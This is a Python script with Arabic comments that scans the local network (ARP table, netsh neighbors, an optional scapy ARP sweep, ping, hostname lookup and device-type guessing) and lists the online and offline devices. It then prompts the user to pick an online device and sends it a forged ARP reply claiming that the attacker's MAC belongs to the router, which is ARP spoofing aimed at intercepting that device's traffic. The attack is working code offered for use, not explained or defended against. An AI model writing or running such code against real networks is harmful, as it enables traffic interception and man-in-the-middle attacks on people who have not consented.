import subprocess
import re
import socket
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
from scapy.all import ARP, send
import uuid

def get_own_mac():
    """Retrieve the MAC address of the current machine."""
    mac_num = hex(uuid.getnode()).replace("0x", "").zfill(12)
    return ":".join([mac_num[e:e+2] for e in range(0, 12, 2)])

def perform_arp_spoof(target_ip, spoof_ip):
    """
    Perform ARP spoofing on a target IP making it believe our machine is the spoof IP (like the router).
    """
    target_mac = get_mac_from_arp_cache(target_ip)
    if not target_mac:
        print(f"[Error] Could not find MAC for target {target_ip}. Make sure the device is online.")
        return
    
    # استخدام عنوان MAC الخاص بنا
    our_mac = get_own_mac()
    
    arp_response = ARP(
        op=2,                 # ARP reply
        pdst=target_ip,       # IP of the target
        hwdst=target_mac,     # Actual MAC of the target
        psrc=spoof_ip,       # IP we pretend to be (e.g., the router)
        hwsrc=our_mac         # Our own MAC address
    )
    
    # إرسال الحزمة
    send(arp_response, verbose=False)
    print(f"ARP Spoofing sent from {spoof_ip} to {target_ip} using our MAC as the router's MAC.")

# يمكنك الآن استخدام هذه الدالة في main بنفس الطريقة مع الأخذ في الاعتبار أننا نستخدم MAC الخاص بنا.

# نحاول استعمال scapy بشكل اختياري (لو موجودة)
try:
    from scapy.all import ARP, Ether, srp
    SCAPY_AVAILABLE = True
except Exception:
    SCAPY_AVAILABLE = False

# فعّل هذا لو تحب فحص ARP نشيط بـ scapy (أبطأ شوية)
USE_SCAPY_ACTIVE_SCAN = False  # خليه False للسرعة القصوى


# --------- أدوات مساعدة عامة ---------

def run_cmd(cmd):
    """Run a command and return stdout as text."""
    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="ignore",
        shell=False,
    )
    return result.stdout


def is_ip_online(ip: str) -> bool:
    """Ping IP once with small timeout. True if reachable."""
    try:
        # -n 1 = one echo, -w 500 = 500ms timeout
        result = subprocess.run(
            ["ping", "-n", "1", "-w", "500", ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return result.returncode == 0
    except Exception:
        return False


def get_mac_from_arp_cache(ip: str) -> str:
    """
    Use 'arp -a <ip>' to find MAC for a specific IP.
    This is the "other function" that links IP -> MAC.
    """
    try:
        output = run_cmd(["arp", "-a", ip])
    except Exception:
        return ""

    mac_pattern = re.compile(
        rf"{re.escape(ip)}\s+([0-9a-fA-F\-]+)\s+(dynamic|static|invalid)",
        re.IGNORECASE,
    )

    for line in output.splitlines():
        m = mac_pattern.search(line)
        if m:
            mac = m.group(1).lower()
            if mac not in {"ff-ff-ff-ff-ff-ff", "00-00-00-00-00-00"}:
                return mac

    return ""


# --------- 1) قراءة ARP TABLE عن طريق arp -a ---------

def get_from_arp_cmd():
    """
    Read ARP table via 'arp -a'.
    Extract IP, MAC, ARP Type.
    """
    output = run_cmd(["arp", "-a"])
    lines = output.splitlines()

    entries = []
    current_interface = None

    pattern = re.compile(
        r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F\-]+)\s+(dynamic|static)",
        re.IGNORECASE,
    )

    for line in lines:
        line = line.strip()
        if not line:
            continue

        if line.lower().startswith("interface:"):
            current_interface = line
            continue

        m = pattern.match(line)
        if m:
            ip, mac, arp_type = m.groups()
            entries.append({
                "source": "arp",
                "interface": current_interface,
                "ip": ip,
                "mac": mac.lower(),
                "arp_type": arp_type.lower(),
            })

    return entries


# --------- 2) netsh neighbors ---------

def get_from_netsh_neighbors():
    """
    Read ARP/ND cache via:
      netsh interface ip show neighbors
    Extract IP, MAC, State/Type.
    """
    output = run_cmd(["netsh", "interface", "ip", "show", "neighbors"])
    lines = output.splitlines()

    entries = []
    current_interface = None

    for line in lines:
        line = line.strip()
        if not line:
            continue

        if line.lower().startswith("interface"):
            current_interface = line
            continue

        if line.lower().startswith("internet address") or line.startswith("---"):
            continue

        parts = line.split()
        if len(parts) >= 3:
            ip = parts[0]
            mac = parts[1].lower()
            arp_type = parts[2].lower()  # dynamic / static / incomplete...

            if re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
                entries.append({
                    "source": "netsh",
                    "interface": current_interface,
                    "ip": ip,
                    "mac": mac,
                    "arp_type": arp_type,
                })

    return entries


# --------- 3) فحص ARP نشيط (اختياري) ---------

def get_local_network_cidr():
    """
    Guess local /24 network from current IP.
    Example: 192.168.1.12 -> 192.168.1.0/24
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
        except Exception:
            return None

    try:
        net = ipaddress.ip_network(local_ip + "/24", strict=False)
        return str(net)
    except Exception:
        return None


def get_from_scapy_active_scan():
    """
    Optional ARP active scan using scapy.
    """
    if not (SCAPY_AVAILABLE and USE_SCAPY_ACTIVE_SCAN):
        return []

    network = get_local_network_cidr()
    if not network:
        return []

    try:
        arp = ARP(pdst=network)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp

        answered, _ = srp(packet, timeout=2, verbose=False)

        entries = []
        for _, received in answered:
            entries.append({
                "source": "scapy",
                "interface": None,
                "ip": received.psrc,
                "mac": received.hwsrc.lower(),
                "arp_type": "dynamic",
            })
        return entries
    except Exception:
        return []


# --------- 4) دمج النتائج ---------

def merge_entries(*lists_of_entries):
    """
    Merge all results by IP.
    Keep first "good" MAC and ARP type.
    """
    merged = {}

    for entries in lists_of_entries:
        for e in entries:
            ip = e["ip"]
            if ip not in merged:
                merged[ip] = {
                    "ip": ip,
                    "mac": "",
                    "arp_type": "",
                    "interfaces": set(),
                    "sources": set(),
                }

            data = merged[ip]

            mac_new = e.get("mac", "").lower()
            if mac_new and mac_new not in {"ff-ff-ff-ff-ff-ff", "00-00-00-00-00-00"}:
                if not data["mac"]:
                    data["mac"] = mac_new

            arp_new = e.get("arp_type", "").lower()
            if arp_new and not data["arp_type"]:
                data["arp_type"] = arp_new

            if e.get("interface"):
                data["interfaces"].add(e["interface"])
            if e.get("source"):
                data["sources"].add(e["source"])

    for ip, data in merged.items():
        data["interfaces"] = ", ".join(sorted(data["interfaces"])) if data["interfaces"] else ""
        data["sources"] = ", ".join(sorted(data["sources"])) if data["sources"] else ""

    return merged


# --------- 5) Hostname + Device Type + Ping (Multithread) ---------

def resolve_hostname(ip: str) -> str:
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        return hostname
    except Exception:
        return "Unknown"


def guess_device_type(ip: str, hostname: str) -> str:
    h = (hostname or "").lower()

    if ip.endswith(".1") or ip.endswith(".254"):
        return "Router / Gateway (guess)"

    phone_keywords = [
        "android", "iphone", "ipad", "samsung", "huawei", "xiaomi",
        "oneplus", "oppo", "vivo", "redmi", "galaxy", "phone"
    ]
    if any(k in h for k in phone_keywords):
        return "Phone / Tablet (guess)"

    pc_keywords = ["desktop", "laptop", "pc", "win", "workstation"]
    if any(k in h for k in pc_keywords):
        return "PC / Laptop (guess)"

    smart_keywords = ["tv", "chromecast", "roku", "firetv", "printer"]
    if any(k in h for k in smart_keywords):
        return "Smart Device (guess)"

    return "Unknown"


def enrich_hosts_parallel(merged):
    """
    For each IP:
      - ping → online / offline
      - resolve hostname
      - guess device type
      - if MAC missing → use get_mac_from_arp_cache(ip)
    All using threads for speed.
    """
    ips = list(merged.keys())
    info = {}

    def task(ip):
        online = is_ip_online(ip)

        # نقدر نحل الاسم حتى لو offline، لكن هذا أبطأ شوية
        hostname = resolve_hostname(ip)
        dev_type = guess_device_type(ip, hostname)

        mac = merged[ip]["mac"]
        if not mac:
            mac = get_mac_from_arp_cache(ip)

        return ip, online, hostname, dev_type, mac

    if not ips:
        return info

    max_workers = min(32, len(ips))
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_ip = {executor.submit(task, ip): ip for ip in ips}
        for future in as_completed(future_to_ip):
            ip, online, hostname, dev_type, mac = future.result()
            info[ip] = {
                "online": online,
                "hostname": hostname,
                "device_type": dev_type,
                "mac": mac or "Unknown",
            }

    return info


# --------- 6) MAIN ---------

def main():
    print("Scanning network (grouping ONLINE and OFFLINE devices)...\n")

    arp_entries = get_from_arp_cmd()
    netsh_entries = get_from_netsh_neighbors()
    scapy_entries = get_from_scapy_active_scan()

    merged = merge_entries(arp_entries, netsh_entries, scapy_entries)

    all_ips = sorted(merged.keys(), key=lambda ip: list(map(int, ip.split(".")))) if merged else []

    hostinfo = enrich_hosts_parallel(merged)

    online = []
    offline = []

    for ip in all_ips:
        base = merged[ip]
        extra = hostinfo.get(ip, {})
        row = {
            "ip": ip,
            "mac": extra.get("mac", base["mac"] or "Unknown"),
            "arp_type": base["arp_type"] or "unknown",
            "hostname": extra.get("hostname", "Unknown"),
            "device_type": extra.get("device_type", "Unknown"),
            "sources": base["sources"],
        }
        if extra.get("online", False):
            online.append(row)
        else:
            offline.append(row)

    # ------- Print ONLINE -------
    print("=== ONLINE DEVICES ===\n")
    if not online:
        print("No online devices detected.\n")
    else:
        print(f"{'IP':<16} {'MAC':<20} {'ARP Type':<10} {'Device Name':<35} {'Device Type':<25} {'Sources'}")
        print("-" * 130)
        for d in online:
            print(
                f"{d['ip']:<16} {d['mac']:<20} {d['arp_type']:<10} "
                f"{d['hostname']:<35} {d['device_type']:<25} {d['sources']}"
            )
        print()

    # ------- Print OFFLINE -------
    print("=== OFFLINE / CACHED DEVICES ===\n")
    if not offline:
        print("No offline/cached devices.\n")
    else:
        print(f"{'IP':<16} {'MAC':<20} {'ARP Type':<10} {'Device Name':<35} {'Device Type':<25} {'Sources'}")
        print("-" * 130)
        for d in offline:
            print(
                f"{d['ip']:<16} {d['mac']:<20} {d['arp_type']:<10} "
                f"{d['hostname']:<35} {d['device_type']:<25} {d['sources']}"
            )
        print()

    for idx, device in enumerate(online, start=1):
        print(f"{idx}. IP: {device['ip']}, MAC: {device['mac']}, Device: {device['device_type']}")

    # هنا يمكنك أن تطلب من المستخدم اختيار رقم الجهاز الذي يريد عمل Spoofing عليه
    target_idx = int(input("اختر رقم الجهاز الذي تريد عمل Spoofing عليه: "))
    if 1 <= target_idx <= len(online):
        target_device = online[target_idx - 1]
        target_ip = target_device['ip']
        # مثلاً نقوم بـ Spoofing على الراوتر
        router_ip = "192.168.1.1"  # غيّر هذا إلى IP الراوتر الفعلي
        perform_arp_spoof(target_ip=target_ip, spoof_ip=router_ip)

    print("DONE")

if __name__ == "__main__":
    main()
